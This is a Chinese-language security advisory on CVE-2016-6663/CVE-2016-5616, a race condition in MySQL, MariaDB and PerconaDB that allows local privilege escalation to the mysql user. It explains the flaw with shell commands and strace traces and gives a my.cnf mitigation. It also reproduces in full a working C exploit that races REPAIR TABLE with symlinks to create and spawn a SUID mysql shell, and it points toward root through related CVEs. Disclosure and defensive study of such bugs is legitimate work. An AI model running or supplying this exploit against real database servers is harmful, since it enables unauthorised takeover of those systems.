> 原文链接: https://www.anquanke.com//post/id/84850 


# 【漏洞预警】MySQL / MariaDB / PerconaDB - 提权/条件竞争漏洞(11.4日视频已更新)(附POC)


                                阅读量   
                                **156932**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t01ed185d24da76fab3.png)](https://p0.ssl.qhimg.com/t01ed185d24da76fab3.png)

**<br>**

**漏洞发现人：Dawid Golunski**

**漏洞级别：严重**

**CVE编号 ：CVE-2016-6663 / CVE-2016-5616**

**漏洞影响：**





**漏洞描述 ：**



Dawid Golunski在 MySQl, MariaDB 和 PerconaDB 数据库中发现条件竞争漏洞，该漏洞允许本地用户使用低权限(CREATE/INSERT/SELECT权限)账号提升权限到数据库系统用户（通常是'mysql'）执行任意代码。成功利用此漏洞，允许攻击者完全访问数据库。也有潜在风险通过(CVE-2016-6662 和 CVE-2016-6664漏洞)获取操作系统root权限。



**漏洞细节：**

****

基于MYSQL的数据库允许用户新建数据库，并且指定存储目录。例如：

```
attacker@debian:~$ mkdir /tmp/disktable
attacker@debian:~$ chmod 777 /tmp/disktable/
attacker@debian:~$ ls -ld /tmp/disktable/
drwxrwxrwx 2 attacker attacker 4096 Oct 28 10:53 /tmp/disktable/
```

可以通过data directory参数指定存储目录为/tmp/disktable/





```
mysql&gt; CREATE TABLE poctab1 (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/disktable';
```

执行完成后，查看下目录权限，变为mysql

```
attacker@debian:~$ ls -l /tmp/disktable/
total 0
-rw-rw---- 1 mysql mysql 0 Oct 28 10:53 poctab1.MYD
```

低权限（SELECT/CREATE/INSERT权限）的MYSQL账户，在执行表修复过程中，执行了不安全的临时文件创建。

```
mysql&gt; REPAIR TABLE `poctab1`;
+----------------+--------+----------+----------+
| Table          | Op     | Msg_type | Msg_text |
+----------------+--------+----------+----------+
| testdb.poctab1 | repair | status   | OK       |
+----------------+--------+----------+----------+
```

通过查看系统调用，可以看到

```
[pid  1463] lstat("/tmp/disktable/poctab1.MYD", `{`st_mode=S_IFREG|0660, st_size=0, ...`}`) = 0
[pid  1463] open("/tmp/disktable/poctab1.MYD", O_RDWR) = 65
[pid  1463] access("./testdb/poctab1.TRG", F_OK) = -1 ENOENT (No such file or directory)
[pid  1463] lseek(65, 0, SEEK_CUR)      = 0
[pid  1463] lseek(65, 0, SEEK_END)      = 0
[pid  1463] mprotect(0x7f6a3804f000, 12288, PROT_READ|PROT_WRITE) = 0
[pid  1463] open("/tmp/disktable/poctab1.TMD", O_RDWR|O_CREAT|O_EXCL|O_TRUNC, 0660) = 66
[pid  1463] lseek(65, 0, SEEK_END)      = 0
[pid  1463] lseek(64, 0, SEEK_END)      = 1024
[pid  1463] close(65)                   = 0
[pid  1463] close(66)                   = 0
[pid  1463] lstat("/tmp", `{`st_mode=S_IFDIR|S_ISVTX|0777, st_size=4096, ...`}`) = 0
[pid  1463] lstat("/tmp/disktable", `{`st_mode=S_IFDIR|0777, st_size=4096, ...`}`) = 0
[pid  1463] lstat("/tmp/disktable/poctab1.MYD", `{`st_mode=S_IFREG|0660, st_size=0, ...`}`) = 0
[pid  1463] stat("/tmp/disktable/poctab1.MYD", `{`st_mode=S_IFREG|0660, st_size=0, ...`}`) = 0
[pid  1463] chmod("/tmp/disktable/poctab1.TMD", 0660) = 0
[pid  1463] chown("/tmp/disktable/poctab1.TMD", 110, 115) = 0
[pid  1463] unlink("/tmp/disktable/poctab1.MYD") = 0
[pid  1463] rename("/tmp/disktable/poctab1.TMD", "/tmp/disktable/poctab1.MYD") = 0
```

第一个系统调用是

```
[pid  1463] lstat("/tmp/disktable/poctab1.MYD", `{`st_mode=S_IFREG|0660, st_size=0, ...`}`) = 0
```

我们可以看到，在检验poctab1.MYD表文件权限的时候，也会复制在创建repaired表时的临时文件chmod()权限。因此在

```
[pid  1463] lstat("/tmp/disktable/poctab1.MYD", `{`st_mode=S_IFREG|0660, st_size=0, ...`}`) = 0
```

和

```
[pid  1463] chmod("/tmp/disktable/poctab1.TMD", 0660) = 0
```

系统调用之间，产生了条件竞争漏洞。

如果攻击者删除临时表poctab1.TMD，然后通过符号链接在chmod()操作前替换/var/lib/mysql，则能够完全控制MYSQL的data目录权限。

攻击者可以预设置poctab1.MYD权限为04777(suid)，然后通过有漏洞的chmod()调用有效的复制一个bash shell来执行命令。这里会有一个问题，suid shell将只会保留攻击者的UID，而不是'mysql'用户。因此攻击者需要复制bash shell到mysql用户用户的表文件，然而mysql表文件又不具有写权限。

可以通过新建一个具有组粘帖位（group sticky bit)的目录来绕过这个限制

新建/tmp/disktable/目录，并赋予组粘帖位（group sticky bit)

```
attacker@debian:/tmp/disktable$ chmod g+s /tmp/disktable/
attacker@debian:/tmp/disktable$ ls -ld /tmp/disktable/
drwxrwsrwx 2 attacker attacker 4096 Oct 28 11:25 /tmp/disktable/
```

通过data directory参数指定存储目录为/tmp/disktable/

```
mysql&gt; CREATE TABLE poctab2 (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/disktable';
Query OK, 0 rows affected (0.00 sec)
```

再次查看/tmp/disktable/权限

```
attacker@debian:/tmp/disktable$ ls -l /tmp/disktable/
total 0
-rw-rw---- 1 mysql mysql    0 Oct 28 11:04 poctab1.MYD
-rw-rw---- 1 mysql attacker 0 Oct 28 11:34 poctab2.MYD
```

我们可以看到poctab2.MYD表已经是'mysql'权限了，但是属于'attacker'组。这样'attacker'就能够复制/bin/bash到poctab2.MYD文件了。



**漏洞验证：**

[![](https://p0.ssl.qhimg.com/t019936f1bf328f27f1.png)](https://p0.ssl.qhimg.com/t019936f1bf328f27f1.png)

[![](https://p5.ssl.qhimg.com/t017be918a9801729ce.png)](https://p5.ssl.qhimg.com/t017be918a9801729ce.png)



**POC.**





```
------------------[ mysql-privesc-race.c ]--------------------
/*
MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit
mysql-privesc-race.c (ver. 1.0)
CVE-2016-6663 / OCVE-2016-5616
Discovered/Coded by:
Dawid Golunski
dawid[at]legalhackers.com
@dawid_golunski
http://legalhackers.com
Compile:
gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
Note:
* On RedHat-based systems you might need to change /tmp to another public directory
* For testing purposes only. Do no harm.  
Full advisory URL:
http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
*/
#include &lt;fcntl.h&gt;
#include &lt;grp.h&gt;
#include &lt;mysql.h&gt;
#include &lt;pwd.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/inotify.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;
#define EXP_PATH          "/tmp/mysql_privesc_exploit"
#define EXP_DIRN          "mysql_privesc_exploit"
#define MYSQL_TAB_FILE    EXP_PATH "/exploit_table.MYD"
#define MYSQL_TEMP_FILE   EXP_PATH "/exploit_table.TMD"
#define SUID_SHELL     EXP_PATH "/mysql_suid_shell.MYD"
#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary
MYSQL *conn;  // DB handles
MYSQL_RES *res;
MYSQL_ROW row;
unsigned long cnt;
void intro() `{`
printf( 
        "33[94mn"
        "MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploitn"
        "mysql-privesc-race.c (ver. 1.0)nn"
        "CVE-2016-6663 / OCVE-2016-5616nn"
        "For testing purposes only. Do no harm.nn"
"Discovered/Coded by:nn"
"Dawid Golunski n"
"http://legalhackers.com"
        "33[0mnn");
`}`
void usage(char *argv0) `{`
    intro();
    printf("Usage:nn%s user pass db_host databasenn", argv0);
`}`
void mysql_cmd(char *sql_cmd, int silent) `{`
    
    if (!silent) `{`
    printf("%s n", sql_cmd);
    `}`
    if (mysql_query(conn, sql_cmd)) `{`
        fprintf(stderr, "%sn", mysql_error(conn));
        exit(1);
    `}`
    res = mysql_store_result(conn);
    if (res&gt;0) mysql_free_result(res);
`}`
int main(int argc,char **argv)
`{`
    int randomnum = 0;
    int io_notified = 0;
    int myd_handle;
    int wpid;
    int is_shell_suid=0;
    pid_t pid;
    int status;
    struct stat st;
    /* io notify */
    int fd;
    int ret;
    char buf[4096] __attribute__((aligned(8)));
    int num_read;
    struct inotify_event *event;
    /* credentials */
    char *user     = argv[1];
    char *password = argv[2];
    char *db_host  = argv[3];
    char *database = argv[4];
    // Disable buffering of stdout
    setvbuf(stdout, NULL, _IONBF, 0);
    // Get the params
    if (argc!=5) `{`
usage(argv[0]);
exit(1);
    `}` 
    intro();
    // Show initial privileges
    printf("n[+] Starting the exploit as: n");
    system("id");
    // Connect to the database server with provided credentials
    printf("n[+] Connecting to the database `%s` as %s@%sn", database, user, db_host);
    conn = mysql_init(NULL);
    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) `{`
        fprintf(stderr, "%sn", mysql_error(conn));
        exit(1);
    `}`
    // Prepare tmp dir
    printf("n[+] Creating exploit temp directory %sn", "/tmp/" EXP_DIRN);
    umask(000);
    system("rm -rf /tmp/" EXP_DIRN " &amp;&amp; mkdir /tmp/" EXP_DIRN);
    system("chmod g+s /tmp/" EXP_DIRN );
    // Prepare exploit tables :)
    printf("n[+] Creating mysql tables nn");
    mysql_cmd("DROP TABLE IF EXISTS exploit_table", 0);
    mysql_cmd("DROP TABLE IF EXISTS mysql_suid_shell", 0);
    mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);
    mysql_cmd("CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);
    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file
    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory
    printf("n[+] Copying bash into the mysql_suid_shell table.n    After the exploitation the following file/table will be assigned SUID and executable bits : n");
    system("cp /bin/bash " SUID_SHELL);
    system("ls -l " SUID_SHELL);
    // Use inotify to get the timing right
    fd = inotify_init();
    if (fd &lt; 0) `{`
        printf("failed to inotify_initn");
        return -1;
    `}`
    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);
    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */
    printf("n[+] Entering the race loop... Hang in there...n");
    while ( is_shell_suid != 1 ) `{`
        cnt++;
if ( (cnt % 100) == 0 ) `{`
 printf("-&gt;");
 //fflush(stdout);
`}`
        /* Create empty file , remove if already exists */
        unlink(MYSQL_TEMP_FILE);
        unlink(MYSQL_TAB_FILE);
   mysql_cmd("DROP TABLE IF EXISTS exploit_table", 1);
mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 1);
/* random num if needed */
        srand ( time(NULL) );
        randomnum = ( rand() % MAX_DELAY );
        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink
        pid = fork();
        if (pid &lt; 0) `{`
            fprintf(stderr, "Fork failed :(n");
        `}`
        /* Child process - executes REPAIR TABLE  SQL statement */
        if (pid == 0) `{`
            usleep(500);
            unlink(MYSQL_TEMP_FILE);
    mysql_cmd("REPAIR TABLE exploit_table EXTENDED", 1);
            // child stops here
            exit(0);
        `}`
        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */
        if (pid &gt; 0 ) `{`
            io_notified = 0;
            while (1) `{`
                int processed = 0;
                ret = read(fd, buf, sizeof(buf));
                if (ret &lt; 0) `{`
                    break;
                `}`
                while (processed &lt; ret) `{`
                    event = (struct inotify_event *)(buf + processed);
                    if (event-&gt;mask &amp; IN_CLOSE) `{`
                        if (!strcmp(event-&gt;name, "exploit_table.TMD")) `{`
                            //usleep(randomnum);
    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file 
    unlink(MYSQL_TAB_FILE);
    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);
    close(myd_handle);
    chmod(MYSQL_TAB_FILE, 04777);
    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec
                            unlink(MYSQL_TEMP_FILE);
                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);
                            io_notified=1;
                        `}`
                    `}`
                    processed += sizeof(struct inotify_event);
                `}`
                if (io_notified) `{`
                    break;
                `}`
            `}`
            waitpid(pid, &amp;status, 0);
        `}`
// Check if SUID bit was set at the end of this attempt
        if ( lstat(SUID_SHELL, &amp;st) == 0 ) `{`
    if (st.st_mode &amp; S_ISUID) `{`
is_shell_suid = 1;
    `}`
        `}` 
    `}`
    printf("nn[+] 33[94mBingo! Race won (took %lu tries) !33[0m Check out the 33[94mmysql SUID shell33[0m: nn", cnt);
    system("ls -l " SUID_SHELL);
    printf("n[+] Spawning the 33[94mmysql SUID shell33[0m now... n    Remember that from there you can gain 33[1;31mroot33[0m with vuln 33[1;31mCVE-2016-666233[0m or 33[1;31mCVE-2016-666433[0m :)nn");
    system(SUID_SHELL " -p -i ");
    //system(SUID_SHELL " -p -c '/bin/bash -i -p'");
    /* close MySQL connection and exit */
    printf("n[+] Job done. Exitingnn");
    mysql_close(conn);
    return 0;
`}`
```

**<br>**

**视频参考(11.04 9:37更新）：<br>**

****







**临时解决办法：**

****

在my.cnf中添加

```
symbolic-links = 0
```

**<br>**

**参考链接：**

****

[http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html](http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)



[![](https://p2.ssl.qhimg.com/t01ccfa91a61b277982.jpg)](https://p2.ssl.qhimg.com/t01ccfa91a61b277982.jpg)[![](https://p4.ssl.qhimg.com/t01bc1688d2010fb70a.jpg)](https://p4.ssl.qhimg.com/t01bc1688d2010fb70a.jpg)[](http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)
